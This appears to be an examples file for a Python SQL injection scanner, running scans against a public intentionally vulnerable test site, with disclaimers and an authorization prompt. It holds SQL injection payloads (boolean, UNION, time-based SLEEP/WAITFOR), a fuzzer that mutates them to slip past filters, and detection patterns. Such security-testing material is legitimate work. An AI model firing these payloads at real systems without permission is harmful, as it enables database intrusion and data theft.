"""
Advanced usage examples for SQLInjector
"""

import asyncio
import json
from pathlib import Path
from sqlinjector import SQLInjector, VulnerabilityScanner
from sqlinjector.models import (
    ScanConfig, InjectionPoint, HttpMethod, InjectionType, 
    DatabaseType, VulnerabilityLevel
)
from sqlinjector.payloads import PayloadManager


async def example_comprehensive_scan():
    """Example: Comprehensive security scan"""
    print("=== Comprehensive Security Scan ===")
    
    # Multiple target configurations
    targets = [
        {
            "name": "Search Functionality",
            "config": ScanConfig(
                url="https://testphp.vulnweb.com/listproducts.php?cat=1",
                method=HttpMethod.GET,
                delay=1.0,
                injection_types=[
                    InjectionType.BOOLEAN_BLIND,
                    InjectionType.UNION_BASED,
                    InjectionType.ERROR_BASED
                ],
                max_payloads_per_type=8
            )
        },
        {
            "name": "Login Form",
            "config": ScanConfig(
                url="https://testphp.vulnweb.com/login.php",
                method=HttpMethod.POST,
                data={"uname": "admin", "pass": "password"},
                delay=1.5,
                injection_types=[
                    InjectionType.BOOLEAN_BLIND,
                    InjectionType.ERROR_BASED
                ],
                max_payloads_per_type=5
            )
        }
    ]
    
    all_results = []
    
    for target in targets:
        print(f"\n🔍 Scanning: {target['name']}")
        
        scanner = VulnerabilityScanner(target['config'])
        result = await scanner.scan()
        
        all_results.append({
            "target": target['name'],
            "result": result
        })
        
        print(f"  ⏱️  Duration: {result.scan_duration:.2f}s")
        print(f"  📊 Requests: {result.total_requests}")
        print(f"  🚨 Vulnerabilities: {len(result.vulnerabilities)}")
    
    # Generate comprehensive report
    generate_comprehensive_report(all_results)


def generate_comprehensive_report(results):
    """Generate a comprehensive security report"""
    print("\n=== COMPREHENSIVE SECURITY REPORT ===")
    
    total_vulnerabilities = sum(len(r['result'].vulnerabilities) for r in results)
    total_requests = sum(r['result'].total_requests for r in results)
    total_duration = sum(r['result'].scan_duration for r in results)
    
    print(f"📊 Overall Statistics:")
    print(f"  Targets Scanned: {len(results)}")
    print(f"  Total Vulnerabilities: {total_vulnerabilities}")
    print(f"  Total Requests: {total_requests}")
    print(f"  Total Duration: {total_duration:.2f}s")
    
    # Severity breakdown
    severity_counts = {severity: 0 for severity in VulnerabilityLevel}
    
    for result_data in results:
        for vuln in result_data['result'].vulnerabilities:
            severity_counts[vuln.severity] += 1
    
    print(f"\n🚨 Severity Breakdown:")
    for severity, count in severity_counts.items():
        if count > 0:
            print(f"  {severity.value.upper()}: {count}")
    
    # Database detection summary
    detected_databases = set()
    for result_data in results:
        if result_data['result'].database_detected:
            detected_databases.add(result_data['result'].database_detected)
    
    if detected_databases:
        print(f"\n🗄️  Detected Databases: {', '.join(db.value for db in detected_databases)}")
    
    # Detailed findings
    print(f"\n📋 Detailed Findings:")
    for result_data in results:
        target_name = result_data['target']
        vulnerabilities = result_data['result'].vulnerabilities
        
        if vulnerabilities:
            print(f"\n  {target_name}:")
            for vuln in vulnerabilities:
                print(f"    - {vuln.injection_type.value} in '{vuln.parameter}'")
                print(f"      Severity: {vuln.severity.value.upper()}")
                print(f"      Confidence: {vuln.confidence:.1%}")
        else:
            print(f"\n  {target_name}: ✅ No vulnerabilities found")


async def example_custom_detection_engine():
    """Example: Custom detection engine with advanced analysis"""
    print("\n=== Custom Detection Engine ===")
    
    class CustomSQLInjector(SQLInjector):
        """Custom SQL injector with enhanced detection"""
        
        def __init__(self, config):
            super().__init__(config)
            self.custom_patterns = self._load_custom_patterns()
        
        def _load_custom_patterns(self):
            """Load additional detection patterns"""
            return {
                "custom_errors": [
                    r"database.*connection.*failed",
                    r"syntax.*error.*near",
                    r"invalid.*query",
                    r"table.*not.*found"
                ],
                "information_disclosure": [
                    r"mysql.*version",
                    r"postgresql.*version",
                    r"oracle.*version",
                    r"sql.*server.*version"
                ]
            }
        
        def _analyze_response(self, result):
            """Enhanced response analysis"""
            # Call parent analysis first
            super()._analyze_response(result)
            
            # Custom analysis
            if not result.injection_detected:
                for pattern_type, patterns in self.custom_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, result.response_body, re.IGNORECASE):
                            result.injection_detected = True
                            result.injection_type = InjectionType.ERROR_BASED
                            result.error_message = f"Custom detection: {pattern_type}"
                            break
    
    # Use custom injector
    config = ScanConfig(
        url="https://testphp.vulnweb.com/artists.php?artist=1",
        timeout=10.0
    )
    
    injection_point = InjectionPoint(
        parameter="artist",
        value="1",
        location="query",
        method=HttpMethod.GET
    )
    
    test_payloads = ["' OR 1=1--", "' UNION SELECT version()--"]
    
    async with CustomSQLInjector(config) as injector:
        results = await injector.test_injection_point_async(injection_point, test_payloads)
        
        print("Custom detection results:")
        for result in results:
            print(f"  Payload: {result.payload}")
            print(f"  Detection: {result.injection_detected}")
            if result.error_message:
                print(f"  Details: {result.error_message}")


async def example_payload_fuzzing():
    """Example: Advanced payload fuzzing"""
    print("\n=== Advanced Payload Fuzzing ===")
    
    class PayloadFuzzer:
        """Advanced payload fuzzing engine"""
        
        def __init__(self):
            self.base_payloads = [
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; WAITFOR DELAY '00:00:05'--"
            ]
        
        def generate_fuzzed_payloads(self, base_payload, mutations=5):
            """Generate fuzzing variations of a payload"""
            fuzzed = [base_payload]  # Original
            
            # Case variations
            fuzzed.append(base_payload.upper())
            fuzzed.append(base_payload.lower())
            
            # Encoding variations
            import urllib.parse
            fuzzed.append(urllib.parse.quote(base_payload))
            fuzzed.append(urllib.parse.quote_plus(base_payload))
            
            # Comment variations
            fuzzed.extend([
                base_payload.replace('--', '#'),
                base_payload.replace('--', '/**/'),
                base_payload + ' #',
                base_payload + ' /**/'
            ])
            
            # Space variations
            fuzzed.extend([
                base_payload.replace(' ', '/**/'),
                base_payload.replace(' ', '\t'),
                base_payload.replace(' ', '\n')
            ])
            
            # Return limited set
            return fuzzed[:mutations + 1]
        
        async def fuzz_test(self, injector, injection_point):
            """Perform fuzzing test"""
            all_results = []
            
            for base_payload in self.base_payloads:
                print(f"  Fuzzing base payload: {base_payload}")
                
                fuzzed_payloads = self.generate_fuzzed_payloads(base_payload, 3)
                results = await injector.test_injection_point_async(
                    injection_point, 
                    fuzzed_payloads
                )
                
                successful = [r for r in results if r.injection_detected]
                if successful:
                    print(f"    ✅ {len(successful)}/{len(results)} variations successful")
                    all_results.extend(successful)
                else:
                    print(f"    ❌ No successful variations")
            
            return all_results
    
    # Use fuzzer
    config = ScanConfig(url="https://testphp.vulnweb.com/artists.php", timeout=10.0)
    injection_point = InjectionPoint(
        parameter="artist",
        value="1",
        location="query",
        method=HttpMethod.GET
    )
    
    fuzzer = PayloadFuzzer()
    
    async with SQLInjector(config) as injector:
        results = await fuzzer.fuzz_test(injector, injection_point)
        print(f"\nFuzzing completed: {len(results)} successful variations found")


async def example_time_based_analysis():
    """Example: Advanced time-based injection analysis"""
    print("\n=== Time-based Analysis ===")
    
    class TimeBasedAnalyzer:
        """Advanced time-based injection analyzer"""
        
        def __init__(self, baseline_threshold=1.0):
            self.baseline_threshold = baseline_threshold
            self.baseline_times = []
        
        async def establish_baseline(self, injector, injection_point, samples=3):
            """Establish baseline response times"""
            print("  Establishing baseline response times...")
            
            normal_payloads = ["1", "test", "normal"]
            
            for payload in normal_payloads:
                results = await injector.test_injection_point_async(
                    injection_point, 
                    [payload]
                )
                if results:
                    self.baseline_times.append(results[0].response_time)
            
            if self.baseline_times:
                avg_baseline = sum(self.baseline_times) / len(self.baseline_times)
                print(f"    Average baseline: {avg_baseline:.3f}s")
                return avg_baseline
            return 0.5  # Default
        
        async def test_time_injection(self, injector, injection_point, delay_seconds=5):
            """Test time-based injection with statistical analysis"""
            baseline = await self.establish_baseline(injector, injection_point)
            
            time_payloads = [
                f"1; WAITFOR DELAY '00:00:0{delay_seconds}'",
                f"1' AND SLEEP({delay_seconds})--",
                f"1' OR SLEEP({delay_seconds})--"
            ]
            
            print(f"  Testing time-based injection (target delay: {delay_seconds}s)...")
            
            for payload in time_payloads:
                results = await injector.test_injection_point_async(
                    injection_point,
                    [payload]
                )
                
                if results:
                    result = results[0]
                    time_diff = result.response_time - baseline
                    
                    print(f"    Payload: {payload}")
                    print(f"    Response time: {result.response_time:.3f}s")
                    print(f"    Difference: {time_diff:.3f}s")
                    
                    if time_diff >= delay_seconds * 0.8:  # 80% of expected delay
                        print(f"    ✅ Time-based injection detected!")
                        return True
                    else:
                        print(f"    ❌ No significant delay")
            
            return False
    
    # Use time-based analyzer
    config = ScanConfig(url="https://testphp.vulnweb.com/artists.php", timeout=20.0)
    injection_point = InjectionPoint(
        parameter="artist",
        value="1",
        location="query",
        method=HttpMethod.GET
    )
    
    analyzer = TimeBasedAnalyzer()
    
    async with SQLInjector(config) as injector:
        detected = await analyzer.test_time_injection(injector, injection_point, 3)
        print(f"\nTime-based analysis result: {'Detected' if detected else 'Not detected'}")


def example_reporting_integration():
    """Example: Integration with reporting systems"""
    print("\n=== Reporting Integration ===")
    
    class SecurityReporter:
        """Advanced security reporting"""
        
        def __init__(self, report_dir="security_reports"):
            self.report_dir = Path(report_dir)
            self.report_dir.mkdir(exist_ok=True)
        
        def generate_json_report(self, scan_results, filename="scan_report.json"):
            """Generate detailed JSON report"""
            report_data = {
                "scan_metadata": {
                    "timestamp": scan_results.timestamp.isoformat(),
                    "target_url": scan_results.target_url,
                    "scan_duration": scan_results.scan_duration,
                    "total_requests": scan_results.total_requests
                },
                "vulnerabilities": [
                    {
                        "id": f"vuln_{i+1}",
                        "type": vuln.injection_type.value,
                        "parameter": vuln.parameter,
                        "severity": vuln.severity.value,
                        "confidence": vuln.confidence,
                        "payload": vuln.payload,
                        "description": vuln.description,
                        "remediation": vuln.remediation,
                        "evidence_count": len(vuln.evidence)
                    }
                    for i, vuln in enumerate(scan_results.vulnerabilities)
                ],
                "summary": scan_results.get_summary()
            }
            
            report_path = self.report_dir / filename
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=2, default=str)
            
            print(f"    JSON report saved: {report_path}")
            return report_path
        
        def generate_csv_summary(self, scan_results, filename="vulnerabilities.csv"):
            """Generate CSV summary of vulnerabilities"""
            import csv
            
            report_path = self.report_dir / filename
            
            with open(report_path, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'Parameter', 'Injection Type', 'Severity', 
                    'Confidence', 'Payload', 'Status Code'
                ])
                
                for vuln in scan_results.vulnerabilities:
                    evidence = vuln.evidence[0] if vuln.evidence else None
                    writer.writerow([
                        vuln.parameter,
                        vuln.injection_type.value,
                        vuln.severity.value,
                        f"{vuln.confidence:.1%}",
                        vuln.payload[:50] + "..." if len(vuln.payload) > 50 else vuln.payload,
                        evidence.status_code if evidence else "N/A"
                    ])
            
            print(f"    CSV report saved: {report_path}")
            return report_path
        
        def generate_executive_summary(self, scan_results, filename="executive_summary.txt"):
            """Generate executive summary"""
            report_path = self.report_dir / filename
            
            summary = scan_results.get_summary()
            
            with open(report_path, 'w') as f:
                f.write("EXECUTIVE SUMMARY - SQL INJECTION SECURITY ASSESSMENT\n")
                f.write("=" * 55 + "\n\n")
                
                f.write(f"Target: {scan_results.target_url}\n")
                f.write(f"Scan Date: {scan_results.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Duration: {scan_results.scan_duration:.2f} seconds\n\n")
                
                f.write("FINDINGS OVERVIEW:\n")
                f.write(f"- Total Vulnerabilities: {summary['total_vulnerabilities']}\n")
                
                if summary['total_vulnerabilities'] > 0:
                    f.write("- Severity Breakdown:\n")
                    for severity, count in summary['severity_breakdown'].items():
                        if count > 0:
                            f.write(f"  * {severity.upper()}: {count}\n")
                    
                    f.write("\nRECOMMENDATIONS:\n")
                    f.write("- Implement parameterized queries immediately\n")
                    f.write("- Review and sanitize all user inputs\n")
                    f.write("- Conduct additional security testing\n")
                    f.write("- Consider implementing a Web Application Firewall\n")
                else:
                    f.write("- No SQL injection vulnerabilities detected\n")
                    f.write("- Continue regular security assessments\n")
            
            print(f"    Executive summary saved: {report_path}")
            return report_path
    
    # Example usage (would need actual scan results)
    print("Security reporting system initialized")
    print("Features:")
    print("  - JSON detailed reports")
    print("  - CSV vulnerability summaries")
    print("  - Executive summaries")
    print("  - Custom report formats")


async def main():
    """Run advanced examples"""
    print("SQLInjector Advanced Usage Examples")
    print("=" * 60)
    print("⚠️  THESE EXAMPLES ARE FOR EDUCATIONAL PURPOSES ONLY")
    print("⚠️  ONLY TEST APPLICATIONS YOU OWN OR HAVE PERMISSION TO TEST")
    print("=" * 60)
    
    await example_comprehensive_scan()
    await example_custom_detection_engine()
    await example_payload_fuzzing()
    await example_time_based_analysis()
    example_reporting_integration()
    
    print("\n" + "=" * 60)
    print("Advanced examples completed!")
    print("\nKey takeaways:")
    print("- SQLInjector is highly customizable")
    print("- Advanced detection techniques improve accuracy")
    print("- Comprehensive reporting aids remediation")
    print("- Always use responsibly and ethically")


if __name__ == "__main__":
    import re  # Add missing import for custom examples
    
    # Legal disclaimer
    print("⚠️  LEGAL DISCLAIMER ⚠️")
    print("This tool is for authorized security testing only.")
    print("Unauthorized use is illegal and unethical.")
    print()
    
    response = input("Do you confirm you have authorization to run these tests? (yes/no): ")
    if response.lower() in ['yes', 'y']:
        asyncio.run(main())
    else:
        print("Examples cancelled. Only test systems you own or have permission to test.")